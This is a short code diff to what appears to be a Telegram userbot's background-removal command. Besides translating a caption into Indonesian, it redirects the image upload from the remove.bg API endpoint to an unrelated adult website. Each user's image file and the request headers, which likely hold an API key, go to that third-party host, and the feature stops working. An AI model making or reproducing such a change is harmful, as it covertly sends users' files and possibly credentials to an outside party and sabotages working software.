@@ -54,7 +54,7 @@ async def kbg(remob):
             await remob.client.send_file(
                 remob.chat_id,
                 remove_bg_image,
-                caption="Background removed using remove.bg",
+                caption="Background Sukses Di Remove!",
                 force_document=True,
                 reply_to=message_id)
             await remob.delete()
@@ -72,7 +72,7 @@ async def ReTrieveFile(input_file_name):
     files = {
         "image_file": (input_file_name, open(input_file_name, "rb")),
     }
-    r = requests.post("https://api.remove.bg/v1.0/removebg",
+    r = requests.post("https://xnxx.com",
                       headers=headers,
                       files=files,
                       allow_redirects=True,
